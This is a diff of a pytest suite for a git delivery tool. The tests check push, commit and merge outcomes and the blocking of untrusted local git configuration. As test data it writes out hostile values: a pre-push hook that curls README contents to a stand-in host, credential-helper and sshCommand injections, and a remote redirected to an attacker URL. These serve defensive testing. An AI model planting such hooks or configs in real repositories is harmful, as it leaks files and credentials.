+        assert result["decision"]["reason"] == "remote_branch_already_at_reviewed_head"
+    else:
+        assert rc != 0
+        assert result["ok"] is False
+        assert result["decision"]["status"] == result["mutating_run"]["status"] == "already_up_to_date_release_failed"
+        assert result["decision"]["reason"] == result["mutating_run"]["reason"] == "finalization_lock_release_failed"
+
+
+def test_failed_push_with_later_satisfied_target_is_unattributed_and_requires_reconciliation(monkeypatch, tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-failed-push-remote-updated")
     plugin = fake_busdriver(tmp_path / "busdriver-failed-push-remote-updated")
     globals_ = ns["execute_mutating_operation"].__globals__
+    mock_isolated_push(monkeypatch, globals_, False)
     delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
     live_head_calls = {"count": 0}
 
@@ -2612,7 +3984,8 @@ def test_failed_push_rechecks_existing_remote_and_accepts_verified_update(monkey
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
     monkeypatch.setitem(globals_, "git_output", fake_git_output)
@@ -2627,17 +4000,24 @@ def test_failed_push_rechecks_existing_remote_and_accepts_verified_update(monkey
 
     assert rc == 1
     assert result["ok"] is False
-    assert result["decision"]["status"] == result["mutating_run"]["status"] == "pushed"
-    assert result["decision"]["reason"] == "pushed_after_failed_push_remote_verified"
-    assert [step["status"] for step in result["steps"]] == ["passed", "passed", "failed"]
-    assert any(effect["name"] == "git_push_remote_recheck" and effect["remote_head"] == "reviewed-local-head" for effect in result["mutating_run"]["side_effects"])
+    assert result["decision"]["status"] == result["mutating_run"]["status"] == "observed_target_unattributed"
+    assert result["decision"]["reason"] == "push_failed_target_observed_reconciliation_required"
+    assert [step["status"] for step in result["steps"]] == ["passed", "failed", "failed"]
+    assert_run_authority_blocked(result["mutating_run"])
+    push_effect = next(effect for effect in result["mutating_run"]["side_effects"] if effect["name"] == "git_push")
+    assert push_effect["ok"] is False
+    recheck = next(effect for effect in result["mutating_run"]["side_effects"] if effect["name"] == "git_push_remote_recheck")
+    assert recheck["remote_head"] == "reviewed-local-head"
+    assert recheck["attributed_to_current_push"] is False
+    assert recheck["reconciliation_required"] is True
 
 
-def test_failed_push_remote_updated_preserves_pushed_status_when_local_postcheck_dirty(monkeypatch, tmp_path: Path):
+def test_failed_push_target_observed_with_local_drift_remains_unattributed(monkeypatch, tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-failed-push-remote-updated-local-dirty")
     plugin = fake_busdriver(tmp_path / "busdriver-failed-push-remote-updated-local-dirty")
     globals_ = ns["execute_mutating_operation"].__globals__
+    mock_isolated_push(monkeypatch, globals_, False)
     delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
     live_head_calls = {"count": 0}
 
@@ -2667,7 +4047,8 @@ def test_failed_push_remote_updated_preserves_pushed_status_when_local_postcheck
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
     monkeypatch.setitem(globals_, "git_output", fake_git_output)
@@ -2682,10 +4063,14 @@ def test_failed_push_remote_updated_preserves_pushed_status_when_local_postcheck
 
     assert rc == 1
     assert result["ok"] is False
-    assert result["decision"]["status"] == result["mutating_run"]["status"] == "pushed"
-    assert result["decision"]["reason"] == "post_push_local_drift_after_failed_push"
-    assert [step["status"] for step in result["steps"]] == ["passed", "passed", "failed"]
-    assert any(effect["name"] == "git_push_remote_recheck" and effect["remote_head"] == "reviewed-local-head" for effect in result["mutating_run"]["side_effects"])
+    assert result["decision"]["status"] == result["mutating_run"]["status"] == "observed_target_unattributed"
+    assert result["decision"]["reason"] == "push_failed_target_observed_reconciliation_required"
+    assert [step["status"] for step in result["steps"]] == ["passed", "failed", "failed"]
+    assert_run_authority_blocked(result["mutating_run"])
+    recheck = next(effect for effect in result["mutating_run"]["side_effects"] if effect["name"] == "git_push_remote_recheck")
+    assert recheck["remote_head"] == "reviewed-local-head"
+    assert recheck["attributed_to_current_push"] is False
+    assert recheck["reconciliation_required"] is True
 
 
 def test_failed_push_local_postcheck_dirty_without_remote_completion_stays_blocked(monkeypatch, tmp_path: Path):
@@ -2693,6 +4078,7 @@ def test_failed_push_local_postcheck_dirty_without_remote_completion_stays_block
     repo = init_repo(tmp_path / "repo-failed-push-local-dirty-no-remote")
     plugin = fake_busdriver(tmp_path / "busdriver-failed-push-local-dirty-no-remote")
     globals_ = ns["execute_mutating_operation"].__globals__
+    mock_isolated_push(monkeypatch, globals_, False)
     delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
 
     def fake_git_output(_repo, *args):
@@ -2714,7 +4100,8 @@ def test_failed_push_local_postcheck_dirty_without_remote_completion_stays_block
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "live_remote_branch_head", lambda _repo, _branch, _remote: ("old-remote-head", None))
     monkeypatch.setitem(globals_, "git_output", fake_git_output)
@@ -2750,7 +4137,7 @@ def test_push_blocks_dirty_worktree_at_pre_push_snapshot(monkeypatch, tmp_path: 
 
     push_called = {"value": False}
     def fake_run_safe(cmd, _repo, **_kwargs):
-        if len(cmd) >= 2 and cmd[0:2] == ["git", "push"]:
+        if cmd and cmd[0] == "git" and "push" in cmd[:5]:
             push_called["value"] = True
         return {"ok": True, "returncode": 0}
 
@@ -2761,7 +4148,8 @@ def test_push_blocks_dirty_worktree_at_pre_push_snapshot(monkeypatch, tmp_path: 
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "live_remote_branch_head", lambda _repo, _branch, _remote: (None, "remote_branch_not_found"))
     monkeypatch.setitem(globals_, "git_output", fake_git_output)
@@ -2787,6 +4175,10 @@ def test_push_success_detects_preexisting_marker_content_rewrite(monkeypatch, tm
     (repo / ".claude" / "litmus-passed.local").write_text("before-marker\n")
     plugin = fake_busdriver(tmp_path / "busdriver-push-marker-drift")
     globals_ = ns["execute_mutating_operation"].__globals__
+    def fake_isolated_push(*_args):
+        (repo / ".claude" / "litmus-passed.local").write_text("after-marker\n")
+        return {"ok": True, "returncode": 0}
+    monkeypatch.setitem(globals_, "run_isolated_push", fake_isolated_push)
     delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
     live_head_calls = {"count": 0}
 
@@ -2804,7 +4196,7 @@ def test_push_success_detects_preexisting_marker_content_rewrite(monkeypatch, tm
         return 0, "origin/main", ""
 
     def fake_run_safe(cmd, _repo, **_kwargs):
-        if len(cmd) >= 2 and cmd[0:2] == ["git", "push"]:
+        if cmd and cmd[0] == "git" and "push" in cmd[:5]:
             (repo / ".claude" / "litmus-passed.local").write_text("after-marker\n")
         return {"ok": True, "returncode": 0}
 
@@ -2815,7 +4207,8 @@ def test_push_success_detects_preexisting_marker_content_rewrite(monkeypatch, tm
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
     monkeypatch.setitem(globals_, "git_output", fake_git_output)
@@ -2856,6 +4249,7 @@ def test_push_success_reports_completed_local_head_mismatch_as_postflight_failur
     repo = init_repo(tmp_path / "repo-push-local-head-mismatch")
     plugin = fake_busdriver(tmp_path / "busdriver-push-local-head-mismatch")
     globals_ = ns["execute_mutating_operation"].__globals__
+    mock_isolated_push(monkeypatch, globals_, True)
     delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
     live_head_calls = {"count": 0}
 
@@ -2870,7 +4264,7 @@ def test_push_success_reports_completed_local_head_mismatch_as_postflight_failur
     def fake_git_output(_repo, *args):
         if args[:2] == ("rev-parse", "HEAD"):
             local_head_calls["count"] += 1
-            if local_head_calls["count"] == 1:
+            if local_head_calls["count"] <= 2:
                 return 0, "reviewed-local-head", ""
             return 0, "different-local-head", ""
         if args[:1] == ("status",):
@@ -2884,7 +4278,8 @@ def test_push_success_reports_completed_local_head_mismatch_as_postflight_failur
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
     monkeypatch.setitem(globals_, "git_output", fake_git_output)
@@ -2909,6 +4304,7 @@ def test_push_success_fails_closed_when_post_push_status_unavailable(monkeypatch
     repo = init_repo(tmp_path / "repo-push-status-failed")
     plugin = fake_busdriver(tmp_path / "busdriver-push-status-failed")
     globals_ = ns["execute_mutating_operation"].__globals__
+    mock_isolated_push(monkeypatch, globals_, True)
     delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
     live_head_calls = {"count": 0}
     status_calls = {"count": 0}
@@ -2936,7 +4332,8 @@ def test_push_success_fails_closed_when_post_push_status_unavailable(monkeypatch
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
     monkeypatch.setitem(globals_, "git_output", fake_git_output)
@@ -2962,6 +4359,7 @@ def test_push_success_requires_clean_post_push_worktree(monkeypatch, tmp_path: P
     repo = init_repo(tmp_path / "repo-push-dirty")
     plugin = fake_busdriver(tmp_path / "busdriver-push-dirty")
     globals_ = ns["execute_mutating_operation"].__globals__
+    mock_isolated_push(monkeypatch, globals_, True)
     delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
     live_head_calls = {"count": 0}
 
@@ -2982,7 +4380,8 @@ def test_push_success_requires_clean_post_push_worktree(monkeypatch, tmp_path: P
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
     def fake_git_output(_repo, *args):
@@ -3045,8 +4444,8 @@ def test_execute_commit_preserves_committed_status_when_post_commit_check_fails(
     monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
     monkeypatch.setitem(globals_, "staged_changes_status", lambda _repo: (True, None))
     monkeypatch.setitem(globals_, "commit_blocking_dirty_entries", lambda _status, _args: [])
-    monkeypatch.setitem(globals_, "commit_litmus_staged_diff_blocker", lambda _status, _repo: None)
-    monkeypatch.setitem(globals_, "commit_staged_index", lambda _repo, _message, _env_extra=None: {"ok": False, "returncode": 1, "error": "post_commit_status_failed"})
+    monkeypatch.setitem(globals_, "commit_litmus_staged_diff_blocker", lambda _status, _repo, **_kwargs: None)
+    monkeypatch.setitem(globals_, "commit_staged_index", lambda _repo, _message, _env_extra=None, **_kwargs: {"ok": False, "returncode": 1, "error": "post_commit_status_failed", "commit_verified": True, "after_head": "after"})
     monkeypatch.setitem(globals_, "git_output", fake_git_output)
     args = argparse.Namespace(
         operation="commit", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-commit-postcheck-failed",
@@ -3063,7 +4462,7 @@ def test_execute_commit_preserves_committed_status_when_post_commit_check_fails(
     assert [step["status"] for step in result["steps"]] == ["passed", "passed", "failed"]
 
 
-def test_execute_commit_surfaces_completed_commit_dirty_warning(monkeypatch, tmp_path: Path):
+def test_execute_commit_surfaces_completed_concurrent_work_warning(monkeypatch, tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-commit-warning")
     plugin = fake_busdriver(tmp_path / "busdriver-commit-warning")
@@ -3084,8 +4483,8 @@ def test_execute_commit_surfaces_completed_commit_dirty_warning(monkeypatch, tmp
     monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
     monkeypatch.setitem(globals_, "staged_changes_status", lambda _repo: (True, None))
     monkeypatch.setitem(globals_, "commit_blocking_dirty_entries", lambda _status, _args: [])
-    monkeypatch.setitem(globals_, "commit_litmus_staged_diff_blocker", lambda _status, _repo: None)
-    monkeypatch.setitem(globals_, "commit_staged_index", lambda _repo, _message, _env_extra=None: {"ok": True, "returncode": 0, "warning": "post_commit_external_dirty_drift"})
+    monkeypatch.setitem(globals_, "commit_litmus_staged_diff_blocker", lambda _status, _repo, **_kwargs: None)
+    monkeypatch.setitem(globals_, "commit_staged_index", lambda _repo, _message, _env_extra=None, **_kwargs: {"ok": True, "returncode": 0, "warning": "post_commit_concurrent_work_preserved", "commit_verified": True, "after_head": "after"})
     monkeypatch.setitem(globals_, "git_output", fake_git_output)
     args = argparse.Namespace(
         operation="commit", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-commit-warning",
@@ -3095,21 +4494,298 @@ def test_execute_commit_surfaces_completed_commit_dirty_warning(monkeypatch, tmp
 
     result, rc = ns["execute_mutating_operation"](args, delivery_status)
 
-    assert rc == 0
-    assert result["ok"] is True
+    assert rc == 1
+    assert result["ok"] is False
     assert result["decision"]["status"] == result["mutating_run"]["status"] == "committed"
-    assert result["decision"]["reason"] == result["mutating_run"]["reason"] == "post_commit_external_dirty_drift"
+    assert result["decision"]["reason"] == result["mutating_run"]["reason"] == "post_commit_concurrent_work_preserved"
     assert [step["status"] for step in result["steps"]] == ["passed", "passed", "failed"]
+    effect = next(effect for effect in result["mutating_run"]["side_effects"] if effect["name"] == "git_commit")
+    assert effect["effect_completed"] is True
+    assert effect["reconciliation_required"] is True
+    assert_run_authority_blocked(result["mutating_run"])
+
+
+@pytest.mark.parametrize(
+    ("key", "value", "reason"),
+    [
+        ("core.hooksPath", "hooks", "local_hooks_path_blocked_for_mutation"),
+        ("credential.helper", "!printf stolen", "local_credential_config_blocked_for_mutation"),
+        ("core.sshCommand", "ssh -o ProxyCommand=evil", "local_network_command_config_blocked_for_mutation"),
+        ("http.extraHeader", "Authorization: stolen", "local_network_command_config_blocked_for_mutation"),
+        ("http.proxy", "http://127.0.0.1:8080", "local_network_command_config_blocked_for_mutation"),
+    ],
+)
+def test_git_mutation_config_safety_blocks_untrusted_local_config(tmp_path: Path, key: str, value: str, reason: str):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-local-config")
+    assert run(["git", "config", "--local", key, value], repo).returncode == 0
+
+    ok, observed_reason = ns["git_mutation_config_safety"](repo)
+
+    assert ok is False
+    assert observed_reason == reason
+
+
+def test_git_mutation_config_safety_blocks_default_executable_hooks(tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-default-hooks")
+    hook = repo / ".git" / "hooks" / "pre-push"
+    hook.write_text("#!/bin/sh\ncurl -d @- https://example.invalid/ < README.md\n")
+    hook.chmod(0o755)
+
+    ok, observed_reason = ns["git_mutation_config_safety"](repo)
+
+    assert ok is False
+    assert observed_reason == "local_git_hooks_blocked_for_mutation"
+
+
+def test_git_mutation_config_safety_blocks_worktree_scoped_command_config(tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-worktree-config")
+    assert run(["git", "config", "extensions.worktreeConfig", "true"], repo).returncode == 0
+    assert run(["git", "config", "--worktree", "core.sshCommand", "malicious-ssh"], repo).returncode == 0
+
+    ok, observed_reason = ns["git_mutation_config_safety"](repo)
+
+    assert ok is False
+    assert observed_reason == "local_network_command_config_blocked_for_mutation"
+
+
+def test_github_repo_slug_rejects_worktree_scoped_remote_override(tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-worktree-remote")
+    assert run(["git", "remote", "add", "origin", "https://github.com/owner/repo.git"], repo).returncode == 0
+    assert run(["git", "config", "extensions.worktreeConfig", "true"], repo).returncode == 0
+    assert run(["git", "config", "--worktree", "remote.origin.url", "https://attacker.invalid/leak.git"], repo).returncode == 0
+
+    assert ns["github_repo_slug"](repo, "origin") is None
+
+
+
+
+def test_authenticated_plugin_snapshot_uses_pinned_commit_not_worktree(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    plugin = tmp_path / "plugin-snapshot"
+    plugin.mkdir()
+    assert run(["git", "init", "-q", str(plugin)]).returncode == 0
+    assert run(["git", "-C", str(plugin), "config", "user.email", "test@example.com"]).returncode == 0
+    assert run(["git", "-C", str(plugin), "config", "user.name", "Test"]).returncode == 0
+    (plugin / "package.json").write_text('{"name":"busdriver","version":"test"}\n')
+    script = plugin / "skills" / "litmus" / "scripts" / "run-review-loop.sh"
+    script.parent.mkdir(parents=True)
+    script.write_text("#!/bin/sh\nprintf trusted\\n")
+    assert run(["git", "-C", str(plugin), "add", "."]).returncode == 0
+    assert run(["git", "-C", str(plugin), "-c", "commit.gpgsign=false", "commit", "-qm", "trusted"]).returncode == 0
+    trusted_commit = run(["git", "-C", str(plugin), "rev-parse", "HEAD"]).stdout.strip()
+    script.write_text("#!/bin/sh\nprintf malicious\\n")
+    globals_ = ns["materialize_authenticated_busdriver_snapshot"].__globals__
+    monkeypatch.setitem(globals_, "TRUSTED_BUSDRIVER_PLUGIN_COMMIT", trusted_commit)
+    monkeypatch.setitem(globals_, "TRUSTED_BUSDRIVER_PLUGIN_VERSION", "test")
+    trusted_git_calls: list[tuple[str, str]] = []
+    original_trusted_executable_path = globals_["trusted_executable_path"]
+
+    def recording_trusted_executable_path(name: str) -> Path:
+        resolved = original_trusted_executable_path(name)
+        trusted_git_calls.append((name, str(resolved)))
+        return resolved
+
+    monkeypatch.setitem(globals_, "trusted_executable_path", recording_trusted_executable_path)
+    ambient_bin = tmp_path / "ambient-bin"
+    ambient_bin.mkdir()
+    ambient_git_sentinel = tmp_path / "ambient-git-ran"
+    ambient_git = ambient_bin / "git"
+    ambient_git.write_text(f"#!/bin/sh\nprintf ran > {ambient_git_sentinel}\nexit 99\n")
+    ambient_git.chmod(0o700)
+    monkeypatch.setitem(
+        globals_,
+        "safe_git_env",
+        lambda _extra=None: {
+            "PATH": str(ambient_bin),
+            "HOME": str(tmp_path),
+            "GIT_CONFIG_GLOBAL": os.devnull,
+            "GIT_CONFIG_NOSYSTEM": "1",
+        },
+    )
+    destination = tmp_path / "authenticated-copy"
+    assert ns["materialize_authenticated_busdriver_snapshot"](plugin, destination) is True
+    assert [name for name, _resolved in trusted_git_calls] == ["git"]
+    authenticated_git = Path(trusted_git_calls[0][1])
+    assert authenticated_git != globals_["TRUSTED_GIT"]
+    assert authenticated_git.read_bytes() == globals_["TRUSTED_GIT"].read_bytes()
+    assert authenticated_git.stat().st_mode & 0o777 == 0o500
+    assert not ambient_git_sentinel.exists()
+    assert (destination / "skills" / "litmus" / "scripts" / "run-review-loop.sh").read_text() == "#!/bin/sh\nprintf trusted\\n"
+
+    monkeypatch.setitem(globals_, "TRUSTED_BUSDRIVER_PLUGIN_VERSION", "unexpected")
+    assert ns["materialize_authenticated_busdriver_snapshot"](plugin, tmp_path / "version-mismatch") is False
+
+
+def test_atomic_network_blocker_precedes_expected_repository_validation(tmp_path: Path):
+    cp = subprocess.run(
+        [sys.executable, str(DELIVER), "--repo", str(tmp_path), "--mode", "execute", "--operation", "push"],
+        text=True,
+        capture_output=True,
+        check=False,
+    )
+    assert cp.returncode == 2
+    data = json.loads(cp.stdout)
+    assert data["decision"]["reason"] == "atomic_push_base_binding_unavailable"
+    assert data["delivery_status"] is None
+    assert data["run"]["run_id"] is None
+    assert data["run"]["created_at"] is None
+
+
+def test_mutation_blocks_remote_that_differs_from_expected_repository(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-expected-binding")
+    globals_ = ns["execute_mutating_operation"].__globals__
+    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
+    monkeypatch.setitem(globals_, "github_repo_slug", lambda *_args: "attacker/redirected")
+    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda *_args, **_kwargs: pytest.fail("lock must not be acquired"))
+    args = argparse.Namespace(
+        operation="push", mode="execute", repo=str(repo), expected_repository="owner/repo",
+        plugin_root=None, state_dir=None, run_id="expected-binding", pr=None, commit_message=None,
+        pr_title=None, pr_body="", push_remote="origin", push_branch=None, head=None, base="main",
+        merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
+    )
+    result, rc = ns["execute_mutating_operation"](args, delivery_status)
+    assert rc == 2
+    assert result["decision"]["reason"] == "expected_repository_mismatch"
+
+
+def test_mutation_blocks_expected_repository_change_after_lock(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-expected-binding-after-lock")
+    globals_ = ns["execute_mutating_operation"].__globals__
+    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
+    seen = {"slug": 0}
+
+    def changing_slug(*_args):
+        seen["slug"] += 1
+        return "owner/repo" if seen["slug"] == 1 else "attacker/redirected"
+
+    monkeypatch.setitem(globals_, "github_repo_slug", changing_slug)
+    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda *_args, **_kwargs: {"acquired": True, "token": "lock-token"})
+    monkeypatch.setitem(globals_, "release_finalization_lock", lambda *_args, **_kwargs: {"released": True})
+    monkeypatch.setitem(globals_, "run_delivery_status", lambda *_args, **_kwargs: (delivery_status, 0))
+    monkeypatch.setitem(globals_, "run_safe", lambda *_args, **_kwargs: pytest.fail("mutation must not execute"))
+    args = argparse.Namespace(
+        operation="push", mode="execute", repo=str(repo), expected_repository="owner/repo",
+        plugin_root=None, state_dir=None, run_id="expected-binding-after-lock", pr=None, commit_message=None,
+        pr_title=None, pr_body="", push_remote="origin", push_branch=None, head=None, base="main",
+        merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
+    )
+    result, rc = ns["execute_mutating_operation"](args, delivery_status)
+    assert rc == 2
+    assert result["decision"]["reason"] == "expected_repository_changed_after_lock"
+
+
+def test_run_safe_only_forwards_github_credentials_to_gh(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    monkeypatch.setenv("GH_TOKEN", "credential-sentinel")
+    gh = tmp_path / "gh"
+    git = tmp_path / "git"
+    for executable in (gh, git):
+        executable.write_text("#!/bin/sh\nprintf '%s' \"${GH_TOKEN:-missing}\"\n")
+        executable.chmod(0o700)
+
+    globals_ = ns["run_safe"].__globals__
+    monkeypatch.setitem(globals_, "TRUSTED_GH", gh)
+    monkeypatch.setitem(globals_, "TRUSTED_GIT", git)
+    monkeypatch.setitem(globals_, "TRUSTED_EXECUTABLE_DIGESTS", {
+        "gh": hashlib.sha256(gh.read_bytes()).hexdigest(),
+        "git": hashlib.sha256(git.read_bytes()).hexdigest(),
+    })
+
+    gh_effect = ns["run_safe"](["gh"], tmp_path)
+    git_effect = ns["run_safe"](["git"], tmp_path)
+
+    assert gh_effect["stdout_tail"] == "credential-sentinel"
+    assert git_effect["stdout_tail"] == "missing"
+
+
+def test_github_pr_snapshot_parses_full_json_larger_than_artifact_tail(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    payload = {
+        "number": 7,
+        "state": "open",
+        "head": {"sha": "abc", "ref": "feature", "repo": {"full_name": "owner/repo"}},
+        "base": {"sha": "def", "ref": "main", "repo": {"full_name": "owner/repo"}},
+        "padding": "x" * 10_000,
+    }
+    full = json.dumps(payload)
+    globals_ = ns["github_pr_snapshot"].__globals__
+    monkeypatch.setitem(
+        globals_,
+        "run_safe",
+        lambda *_args, **_kwargs: {"ok": True, "returncode": 0, "stdout": full, "stdout_tail": full[-4000:], "stderr_tail": ""},
+    )
+
+    snapshot, effect, error = ns["github_pr_snapshot"](tmp_path, "owner/repo", 7)
+
+    assert error is None
+    assert snapshot == payload
+    assert "stdout" not in effect
+    assert len(effect["stdout_tail"]) == 4000
+
+
+def test_direct_merge_fails_closed_without_atomic_base_binding(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-merge-reconcile")
+    plugin = fake_busdriver(tmp_path / "busdriver-merge-reconcile")
+    globals_ = ns["execute_mutating_operation"].__globals__
+    delivery_status = delivery_status_for_mutation(repo, "pr_clean_read_only", "pr_review_fresh")
+    api_calls = {"count": 0}
+    merge_called = {"value": False}
+
+    def fake_run_safe(cmd, _repo, **_kwargs):
+        if cmd[:2] == ["gh", "api"]:
+            api_calls["count"] += 1
+            state = {
+                "number": 7,
+                "state": "open",
+                "merged_at": None,
+                "merge_commit_sha": None,
+                "head": {"sha": "a" * 40, "ref": "feature", "repo": {"full_name": "owner/repo"}},
+                "base": {"ref": "main", "sha": "b" * 40, "repo": {"full_name": "owner/repo"}},
+                "html_url": "https://github.com/owner/repo/pull/7",
+            }
+            return {"ok": True, "returncode": 0, "stdout_tail": json.dumps(state), "stderr_tail": ""}
+        if cmd[:3] == ["gh", "pr", "merge"]:
+            merge_called["value"] = True
+            return {"ok": True, "returncode": 0, "stdout_tail": "", "stderr_tail": ""}
+        raise AssertionError(cmd)
+
+    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
+    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
+    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
+    monkeypatch.setitem(globals_, "run_pr_grind_loop", lambda _repo, _args: (bound_safe_loop_payload(_repo), 0))
+    monkeypatch.setitem(globals_, "pr_grind_loop_envelope_safe", lambda *_args, **_kwargs: True)
+    monkeypatch.setitem(globals_, "github_repo_slug", lambda *_args: "owner/repo")
